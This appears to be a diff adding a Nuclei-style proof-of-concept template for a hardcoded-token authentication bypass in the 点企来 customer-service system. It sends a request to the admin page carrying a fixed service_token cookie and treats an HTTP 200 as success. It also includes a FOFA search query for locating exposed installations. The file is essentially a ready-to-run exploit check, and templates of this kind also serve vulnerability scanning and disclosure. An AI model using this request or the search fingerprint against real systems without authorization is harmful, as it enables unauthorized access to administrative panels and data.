@@ -1,0 +1,27 @@
+id: poc-5993333082
+info:
+  name: 点企来客服系统 token 存在硬编码未授权漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  tags: info-leak,unauth,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: body="layui-form-item" && body="/admin/login/check.html"
+http:
+- raw:
+  - 'GET /admin/custom/index.html HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: service_token=OuwfoovK%2BIdd
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    X-Requested-With: XMLHttpRequest'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
